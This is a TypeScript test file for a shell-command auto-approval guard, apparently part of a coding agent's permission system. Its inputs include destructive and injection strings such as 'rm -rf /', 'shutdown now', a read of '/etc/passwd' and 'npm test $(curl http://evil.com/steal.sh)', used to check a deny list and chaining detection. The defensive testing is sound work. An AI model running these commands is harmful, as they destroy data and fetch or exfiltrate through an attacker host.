import { test } from "node:test";
import assert from "node:assert/strict";
import { isAutoApproved, isNeverAutoApproved, hasShellMetacharacters } from "./bash.ts";

test("read-only commands are auto-approved", () => {
  for (const cmd of ["git status", "git diff", "git log", "ls -la", "node --version", "npm ls"]) {
    assert.equal(isAutoApproved(cmd), true, cmd);
  }
});

test("prefix commands (npm test, npx tsc, pytest) are auto-approved", () => {
  assert.equal(isAutoApproved("npm test -- --watch"), true);
  assert.equal(isAutoApproved("npx tsc --noEmit"), true);
  assert.equal(isAutoApproved("pytest -k foo"), true);
});

test("unlisted commands are not auto-approved", () => {
  assert.equal(isAutoApproved("npm run build"), false);
});

test("never-auto-approve list always wins even in auto mode", () => {
  for (const cmd of ["rm -rf dist", "git push origin main", "git reset --hard", "curl http://x", "sudo ls"]) {
    assert.equal(isNeverAutoApproved(cmd), true, cmd);
  }
});

test("commands with redirection or absolute paths outside workspace are never auto-approved", () => {
  assert.equal(isNeverAutoApproved("echo hi > /etc/hosts"), true);
  assert.equal(isNeverAutoApproved("cat /etc/passwd"), true);
});

test("plain read commands are not in the never-auto-approve list", () => {
  assert.equal(isNeverAutoApproved("git status"), false);
});

test("compound/chained commands are never auto-approved, even with an allowlisted prefix", () => {
  assert.equal(isAutoApproved("npm test && npm publish"), false);
  assert.equal(isAutoApproved("ls && shutdown now"), false);
  assert.equal(isAutoApproved("cat foo.txt && rm -rf /important"), false);
  assert.equal(isAutoApproved("find . -name x && shutdown now"), false);
  assert.equal(isAutoApproved("npm test $(curl http://evil.com/steal.sh)"), false);
});

test("never-auto-approve list still catches command substitution without a preceding space", () => {
  assert.equal(isNeverAutoApproved("npm test $(curl http://evil.com)"), true);
});

test("legitimate single commands remain auto-approved after the fix", () => {
  assert.equal(isAutoApproved("npm test"), true);
  assert.equal(isAutoApproved("git status"), true);
});

test("hasShellMetacharacters detects chaining/injection operators", () => {
  for (const cmd of [
    "npm test && npm publish",
    "ls || true",
    "cat a | grep b",
    "echo `whoami`",
    "echo $(whoami)",
    "npm test\nrm -rf /",
    "sleep 5 &",
    "npm test; rm -rf /",
  ]) {
    assert.equal(hasShellMetacharacters(cmd), true, cmd);
  }
  assert.equal(hasShellMetacharacters("npm test -- --watch"), false);
});
